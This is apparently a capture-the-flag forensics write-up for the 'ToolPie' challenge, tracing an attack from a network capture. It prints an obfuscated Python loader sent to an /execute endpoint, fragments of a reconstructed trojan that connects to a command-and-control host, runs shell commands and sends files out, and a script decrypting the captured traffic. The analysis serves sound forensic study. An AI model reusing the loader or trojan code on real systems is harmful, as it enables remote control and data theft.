# Cyber Apocalypse CTF 2025

## ToolPie

> In the bustling town of Eastmarsh, Garrick Stoneforge’s workshop site once stood as a pinnacle of enchanted lock and toolmaking. But dark whispers now speak of a breach by a clandestine faction, hinting that Garrick’s prized designs may have been stolen. Scattered digital remnants cling to the compromised site, awaiting those who dare unravel them. Unmask these cunning adversaries threatening the peace of Eldoria. Investigate the incident, gather evidence, and expose Malakar as the mastermind behind this attack.
> 
> 
> [`forensics_toolpie.zip`](forensics_toolpie.zip)

Tags: _forensics_

## Solution
This challenge comes with a network capture. Opening the `pcap` file with [`Wireshark`](https://www.wireshark.org/) gives us some [`HTTP`](https://en.wikipedia.org/wiki/HTTP) traffic and a lot of [`TCP`](https://en.wikipedia.org/wiki/Transmission_Control_Protocol) packets.

Since the content of the TCP traffic doesn't immediately reveil anything useful, lets concentrate on the HTTP packets first. The page itself (extracted artefact [`here`](artefact01.zip)) offers functionality to upload an execute scripts.

![](image001.png)

To upload scripts, the server exposes an endpoint called `/execute` and expects the script embedded within an [`JSON`](https://en.wikipedia.org/wiki/JSON).

> What is the IP address responsible for compromising the website?\
> `Answer: 194.59.6.66`

> What is the name of the endpoint exploited by the attacker?\
> `Answer: /execute`

```js
async function executeScript() {
    const scriptText = document.getElementById('scriptInput').value;
    const outputArea = document.getElementById('outputArea');
    
    try {
        const response = await fetch('/execute', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ script: scriptText }),
        });
        
        const result = await response.json();
        outputArea.textContent = result.output || 'No output was produced by thy script.';
    } catch (error) {
        outputArea.textContent = 'A mystical error has occurred: ' + error.message;
    }
}
```

In Wireshark we can find a [`POST`](https://en.wikipedia.org/wiki/POST_(HTTP)) request where the user uploaded a script (extracted artefact [`here`](artefact02.zip)).

The output looks a bit messy, as the code was obfuscated, but its not too complicated. First the binary blob is [`decompressed`](https://en.wikipedia.org/wiki/Bzip2) and then loaded via [`marshal.loads`](https://docs.python.org/3/library/marshal.html#marshal.loads).

This function is used to convert python bytecode to a code object so it can be executed in the next step.

```py
{"script":"try:\n    import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(bz2.decompress(b'BZh91AY&SY\\x8d*w\\x00\\x00\\n\\xbb\\x7f\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfe\\xee\\xec\\xe4\\xec\\xec\\xc0?\\xd9\\xff\\xfe\\xf4\"|\\xf9`\\r\\x...
```

Although, we don't want to execute this code, we can just print out the disassemly for further analysis. Here it's important to use the correct python version (3.13 in this case) in order to not run into trouble with wrong or missing opcodes (find the full disassembly [`here`](payload_dis.txt)).

Within the disassembly we can find traces of the [`tool`](https://github.com/Sl-Sanda-Ru/Py-Fuscate) that was used for obfuscation.

> What is the name of the obfuscation tool used by the attacker?\
> `Answer: Py-Fuscate`

```py
import dis, marshal, bz2
from data import data

decompressed_data = bz2.decompress(data)
code_obj = marshal.loads(decompressed_data)
dis.dis(code_obj)
```

The disassembly is quite lengthy, so we can try to decompile it with [`PyLingual`](https://pylingual.io/) or [`Decompyle++`](https://github.com/zrax/pycdc). For this we need to add a correct `pyc` header.

```py
import importlib, sys, marshal, bz2
from data import data

decompressed_data = bz2.decompress(data)
code_obj = marshal.loads(decompressed_data)
pyc_data = importlib._bootstrap_external._code_to_timestamp_pyc(code_obj)
with open('file.pyc', 'wb') as f:
    f.write(pyc_data)
```

Sadly the [`result`](payload_decomp1.txt) is not very good, but at least useable as a good starting point. We can put the disassembly and the decompiled code side by side and fix the parts the decompiler failed.

After fixing it can be seen that this is some trojan like code that allows to download files from a remote machine. There is code to send and receive files as well as functionality to invoke shell commands.

```py
if message == "check":
    enc_answ = enc_mes('check-ok', k)
    client.send(enc_answ)
elif message == "send_file":
    receive_file_thread = threading.Thread(target=receive_file_thread)
    receive_file_thread.start()
elif message == "get_file":
    okenc = enc_mes('ok', k)
    client.send(okenc)
    
    path_to_file = client.recv(1024)
    with open(path_to_file) as f:
        bytes_read = f.read()
        bytes_enc = enc_mes(bytes_read, k)
        filesize = enc_mes(len(bytes_enc), k)
        client.send(filesize)
        
        vsb = dec_mes(client.recv(1024), k)
        client.sendall(bytes_enc)      
elif message != None and message != "" and message == "\n"
    answer = os.open(message).read()
    if anser.encode() == b"":
        client.send('Bad command!'.encode('ascii'))
    else:
        enc_answer = enc_mes(answer, k)
        size = str(len(enc_answer))
        client.send(size.encode())
        ch = client.recv(1024).decode()
        if ch == 'ok':
            client.sendall(enc_answer)
```

Now it's getting clear what the remaining packets in the network capture are. It's most likely the tools communication between client and server. The problem is only, that the data is encrypted.

```py
def enc_mes(mes, key):
    try:
        cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
        cypher_block = 16
        mes = mes.encode() if type(mes)!= bytes else mes
        return cypher.encrypt(pad(mes, cypher_block))
    except:
        return None

def dec_file_mes(mes, key):
    cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
    cypher_block = 16
    s = cypher.decrypt(mes)
    return unpad(s, cypher_block)

def dec_mes(mes, key):
    if mes == b'':
        return mes
        
    try:
        cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
        cypher_block = 16
        v = cypher.decrypt(mes)
        return unpad(v, cypher_block)
    except:
        return "echo Try it againg"
```

We can see the tool uses [`AES CBC`](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation). But as this works synchronously we only need to find the key that is used.

```py
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('13.61.7.218', 55155))
k = ''.join((random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16)))
client.send(f'{user}{SEPARATOR}{k}'.encode())
client.settimeout(600)
receive_thread = threading.Thread(target=receive, args=(client, k))
receive_thread.start()
```

The part that is establishing a connection to [`C2`](https://en.wikipedia.org/wiki/Command_and_control), we can see the key is a random choice from `ascii letters` and `digits`. Then the key is sent to the server and used through the remaining communication.

> What is the IP address and port used by the malware to establish a connection with the Command and Control (C2) server?\
> `Answer: 13.61.7.218:55155`

> What encryption key did the attacker use to secure the data?\
> `Answer: AES`

Very well, so we need to go back to wireshark and find the correct package. It's not too tricky to find, packet #76 contains the unencrypted key: `5UUfizsRsP7oOCAq`.

```bash
0000   0a ab bd 4a 8f da 0a ac 24 d3 65 6f 08 00 45 00   ...J....$.eo..E.
0010   00 61 06 9c 40 00 80 06 00 00 ac 1f 2f 98 0d 3d   .a..@......./..=
0020   07 da fa 97 d7 73 96 36 0f 23 1b c5 f3 97 50 18   .....s.6.#....P.
0030   00 ff f1 21 00 00 65 63 32 61 6d 61 7a 2d 62 6b   ...!..ec2amaz-bk
0040   74 76 69 33 65 5c 61 64 6d 69 6e 69 73 74 72 61   tvi3e\administra
0050   74 6f 72 0a 3c 53 45 50 41 52 41 54 4f 52 3e 35   tor.<SEPARATOR>5
0060   55 55 66 69 7a 73 52 73 50 37 6f 4f 43 41 71      UUfizsRsP7oOCAq
```

Armed with all this knowledge and the ability to decrypt the remaining traffic, we can extract the data from the pcap and decrypt the communication. The following script does this. The file `traffic.txt` contains the packet data that was extracted before with [`tshark`](https://www.wireshark.org/docs/man-pages/tshark.html).

```py
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

index = 0
data = open("traffic.txt", "r").readlines()

def dec_mes(mes, key):
    if mes == b'':
        return mes
    cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
    cypher_block = 16
    v = cypher.decrypt(mes)
    return unpad(v, cypher_block)

def recv():
    global data, index
    buffer = bytes.fromhex(data[index])
    index += 1
    return buffer

def recve(k):
    return dec_mes(recv(), k).decode()

key = recv().decode().split("<SEPARATOR>")[1]
print(key)
while index < len(data):
    mes = recve(key)
    print("->", mes)
    if mes == "check":
        print("<-", recve(key))
    elif mes == "get_file":
        print("<-", recve(key)) # ok
        print("->", recve(key)) # path to file
        file_size = int(recve(key))
        print("<-", file_size) # file size
        print("->", recve(key)) # vsb
        bytes_read = 0
        file_content = bytearray()
        while bytes_read < file_size:
            tmp = recv()
            file_content.extend(tmp)
            bytes_read += len(tmp)
        file_content = dec_mes(file_content, key)
        open("file.pdf", "wb").write(file_content)
    else:
        print("UNK")
        break
```

If we run the tool, we get the following communication plus the pdf the attacker downloaded.

```bash
$ python blub.py
5UUfizsRsP7oOCAq
-> check
<- check-ok
-> get_file
<- ok
-> C:\Users\Administrator\Desktop\garricks_masterwork.pdf
<- 8504240
-> ok
```

```bash
$ md5sum file.pdf
8fde053c8e79cf7e03599d559f90b321  file.pdf
```

> What is the MD5 hash of the file exfiltrated by the attacker?\
> 8fde053c8e79cf7e03599d559f90b321